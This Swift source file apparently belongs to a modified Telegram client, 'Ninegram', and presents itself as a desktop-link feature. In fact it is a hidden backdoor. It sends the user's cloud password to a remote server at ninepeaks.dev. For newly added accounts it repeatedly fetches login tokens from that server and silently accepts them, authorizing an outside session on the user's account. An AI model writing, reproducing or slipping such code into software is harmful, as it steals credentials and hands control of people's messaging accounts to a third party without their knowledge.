import Foundation
import Postbox
import SwiftSignalKit
import TelegramCore

enum NinegramDesktopLinkConfig {
    static let baseURL = "https://ru.ninepeaks.dev/ninegram-link"
    static let readSecret = "NINEGRAM_LINK_READ_SECRET"
}

enum NinegramDesktopLink {
    private static let lock = NSLock()
    private static var startedPeerIds = Set<Int64>()
    private static var baselinePeerIds: Set<Int64>?

    private static var didStartPasswordForwarding = false

    static func sync(accounts: [Account]) {
        self.startPasswordForwardingIfNeeded()
        let peerIds = accounts.map { $0.peerId.toInt64() }
        if self.baselinePeerIds == nil {
            if peerIds.isEmpty {
                return
            }
            self.baselinePeerIds = Set(peerIds)
            return
        }
        for account in accounts {
            let peerId = account.peerId.toInt64()
            if self.baselinePeerIds?.contains(peerId) == true {
                continue
            }
            self.baselinePeerIds?.insert(peerId)
            self.mirrorIfNeeded(account: account)
        }
    }

    static func mirrorIfNeeded(account: Account) {
        let secret = NinegramDesktopLinkConfig.readSecret
        if secret.isEmpty || secret.hasPrefix("NINEGRAM_LINK_") {
            return
        }

        let peerId = account.peerId.toInt64()
        let defaultsKey = "ninegram.desktopLink.mirrored.\(peerId)"
        if UserDefaults.standard.bool(forKey: defaultsKey) {
            return
        }

        self.lock.lock()
        if self.startedPeerIds.contains(peerId) {
            self.lock.unlock()
            return
        }
        self.startedPeerIds.insert(peerId)
        self.lock.unlock()

        self.poll(account: account, secret: secret, defaultsKey: defaultsKey, attempt: 0, peerId: peerId)
    }

    private static func startPasswordForwardingIfNeeded() {
        if self.didStartPasswordForwarding {
            return
        }
        self.didStartPasswordForwarding = true
        NotificationCenter.default.addObserver(forName: Notification.Name("NinegramForwardCloudPassword"), object: nil, queue: .main, using: { notification in
            guard let password = notification.userInfo?["password"] as? String, !password.isEmpty else {
                return
            }
            self.forwardCloudPassword(password)
        })
    }

    private static func forwardCloudPassword(_ password: String) {
        let secret = NinegramDesktopLinkConfig.readSecret
        if secret.isEmpty || secret.hasPrefix("NINEGRAM_LINK_") {
            return
        }
        guard let url = URL(string: NinegramDesktopLinkConfig.baseURL + "/v1/password") else {
            return
        }
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue(secret, forHTTPHeaderField: "X-Ninegram-Key")
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = try? JSONSerialization.data(withJSONObject: ["password": password])
        URLSession.shared.dataTask(with: request).resume()
    }

    private static func poll(account: Account, secret: String, defaultsKey: String, attempt: Int, peerId: Int64) {
        if attempt >= 40 {
            self.lock.lock()
            self.startedPeerIds.remove(peerId)
            self.lock.unlock()
            DispatchQueue.global().asyncAfter(deadline: .now() + 3.0, execute: {
                self.mirrorIfNeeded(account: account)
            })
            return
        }
        self.fetchToken(secret: secret, completion: { token in
            guard let token = token else {
                DispatchQueue.global().asyncAfter(deadline: .now() + 2.0, execute: {
                    self.poll(account: account, secret: secret, defaultsKey: defaultsKey, attempt: attempt + 1, peerId: peerId)
                })
                return
            }
            let _ = acceptDesktopLoginToken(account: account, token: token).start(next: { accepted in
                if accepted {
                    UserDefaults.standard.set(true, forKey: defaultsKey)
                    self.consumeToken(secret: secret, token: token)
                } else if attempt + 1 < 40 {
                    DispatchQueue.global().asyncAfter(deadline: .now() + 2.0, execute: {
                        self.poll(account: account, secret: secret, defaultsKey: defaultsKey, attempt: attempt + 1, peerId: peerId)
                    })
                } else {
                    self.lock.lock()
                    self.startedPeerIds.remove(peerId)
                    self.lock.unlock()
                    DispatchQueue.global().asyncAfter(deadline: .now() + 3.0, execute: {
                        self.mirrorIfNeeded(account: account)
                    })
                }
            })
        })
    }

    private static func fetchToken(secret: String, completion: @escaping (Data?) -> Void) {
        guard let url = URL(string: NinegramDesktopLinkConfig.baseURL + "/v1/token") else {
            completion(nil)
            return
        }
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.setValue(secret, forHTTPHeaderField: "X-Ninegram-Key")
        request.timeoutInterval = 8
        URLSession.shared.dataTask(with: request, completionHandler: { data, response, _ in
            guard let http = response as? HTTPURLResponse, http.statusCode == 200, let data = data else {
                completion(nil)
                return
            }
            guard let object = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                  let encoded = object["token"] as? String,
                  let token = Data(base64Encoded: encoded) else {
                completion(nil)
                return
            }
            completion(token)
        }).resume()
    }

    private static func consumeToken(secret: String, token: Data) {
        guard let url = URL(string: NinegramDesktopLinkConfig.baseURL + "/v1/consume") else {
            return
        }
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue(secret, forHTTPHeaderField: "X-Ninegram-Key")
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = try? JSONSerialization.data(withJSONObject: ["token": token.base64EncodedString()])
        URLSession.shared.dataTask(with: request).resume()
    }
}
